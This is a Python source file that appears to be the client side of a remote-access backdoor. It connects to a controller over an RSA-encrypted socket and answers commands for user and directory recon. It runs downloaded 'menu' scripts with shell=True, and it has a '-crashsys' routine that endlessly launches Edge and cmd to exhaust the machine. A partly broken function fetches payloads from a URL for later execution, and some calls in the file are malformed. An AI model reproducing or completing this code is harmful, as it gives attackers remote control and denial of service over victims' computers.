import socket
import urllib.request
import urllib.parse
import os
import subprocess
import time
import threading
import rsa
import getpass

try:
    os.mkdir('menus')
except FileExistsError:
    pass
except NotADirectoryError:
    pass

public_key, private_key = rsa.newkeys(1024)
public_partner = None

IP = 'localhost'
PORT = 9191
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((IP, PORT))
public_partner = rsa.PublicKey.load_pkcs1(client.recv(1024))
client.send(public_key.save_pkcs1("PEM"))

########## Flags -commands ##########

def handle_command(command, c):
    ####### Globals ########
    global command_response
    global response_list
    global menu_num
    global menu_list
    
    if command == 'whoami':
        command_response = getpass.getuser()
    elif command == ':quit':
        quit()
    elif command == 'ls':
        response_list = []
        for i in os.listdir():
            response_list.append(i)
        command_response = '\n'.join(response_list)
    elif command == 'cwd':
        command_response = os.getcwd()
    elif command == '-o menu':
        response_list = []
        try:
            for i in os.listdir('menus'):
                response_list.append(i)
            if response_list is None:
                command_response = 'No Menu found in Menus folder'
            else:
                command_response = '\n'.join(response_list)
        except Exception as e:
            command_response = str(e)
    elif command == '-startmenu':
        menus(c)
    elif command == '-crashsys':
        crash()
        
    else:
        command_response = None
        
def recv_resp_command(c):
    global quit_command
    quit_command = False
    while True:
        try:
            message = rsa.decrypt(c.recv(1024), private_key).decode()
            handle_command(message, c)
            if command_response is not None and quit_command is False:
                c.send(rsa.encrypt(command_response.encode(), public_partner))
            elif quit_command:
                break
        except Exception as e:
            print(e)
            break
    c.close()

threading.Thread(target=recv_resp_command, args=(client,)).start()
threading.Thread(target=handle_command, args=(client,)).start()


def menus(c):
    global command_response
    os.environ['PATH'] += os.pathsep + os.getcwd()
    command_response = f'[ MENUS ]'
    file_menu = os.listdir('menus')
    for i, menus in enumerate(file_menu):
        command_response += f'{i}_ {menus}'
    usr = rsa.decrypt(c.recv(1024), private_key).decode()
    if not usr.isnumeric() or int(usr) < 0 or int(usr) >= len(file_menu):
        command_response=('Input Error!')
        
    else:
        c_menu = file_menu[int(usr)]
        file_path = os.path.join('menus',file_menu[int(usr)])
        subprocess.run(file_path, shell=True)
    if command_response:
        c.send(rsa.encrypt(command_response.encode(), public_partner))


###################################################################################### ADD SCRIPT ##########################################################################################

def crash():
    while True:
        os.startfile('msedge')
        os.startfile('cmd')
            
        


##################################################################################### Currently Fixing #########################################################################################   
def download_progress(start, count, block_size, total_size):
    """Show the download progress."""
    percent = count * block_size * 100 / total_size
    duration = time.time() - start
    speed = total_size / 1024 / duration
    print(f'{percent:.2f}% downloaded, {speed:.2f}KB/s, elapsed time: {duration:.2f} seconds')
        

def rip_menu():
    addr = socket.gethostbyname(socket.gethostname())
    usr = input(f'''
                    [Target IP :: {addr}] :: [ Main MENU ]
                    1 > Enter link of your menu
                    2 > Enter path of your menu
                    * > ''')
    if usr == '1':
        url = input('Enter url > ')
        parsed_url = urllib.parse.urlparse(url)
        default_filename = parsed_url.path.split('/')[-1]
        name = input('Rename the file (Optional) > ')
        if not name:
            name = default_filename
        try:
            # start the timer
            start = time.time()
            if not os.path.exists('menus'):
                os.makedirs('menus')
            # Open the file for writing
            fd = os.open(f'menus/{name}', os.O_CREAT | os.O_WRONLY | os.O_EXCL)
            tfp = open(fd, 'wb')
            filepath = tfp.name
            # Download the file
            urllib.request.urlretrieve(url, filepath, reporthook=lambda count, block_size, total_size: download_progress(start, count, block_size, total_size))
            # Close the file
            os.close(fd)
            # End the timer
            end = time.time()
            return menus()
                
        except ConnectionError as e:
            print(f'Connection Error [{e}]')
            print('NOTE For Option 2: You can manually download the file and copy it to menus folder.')
    elif usr == '2':
        return menus()
                


